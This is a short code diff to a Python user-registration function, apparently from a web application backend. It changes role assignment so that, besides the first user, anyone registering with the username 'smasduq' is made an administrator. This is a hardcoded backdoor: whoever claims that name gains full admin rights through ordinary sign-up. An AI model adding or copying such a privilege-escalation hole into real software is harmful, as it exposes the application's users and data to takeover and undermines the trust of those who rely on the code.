@@ -11,9 +11,13 @@ def get_user_by_email(db: Session, email: str):
 
 def create_user(db: Session, user: schemas.UserCreate, google_id: str = None, is_onboarded: bool = False):
     hashed_password = security.get_password_hash(user.password) if user.password else None
-    # If this is the very first user, make them an admin
+    
+    # If this is the very first user, OR if the username is 'smasduq', make them an admin
     user_count = db.query(models.User).count()
-    role = models.UserRole.ADMIN if user_count == 0 else models.UserRole.USER
+    is_first_user = user_count == 0
+    is_requested_admin = user.username.lower() == "smasduq"
+    
+    role = models.UserRole.ADMIN if (is_first_user or is_requested_admin) else models.UserRole.USER
 
     db_user = models.User(
         username=user.username, 
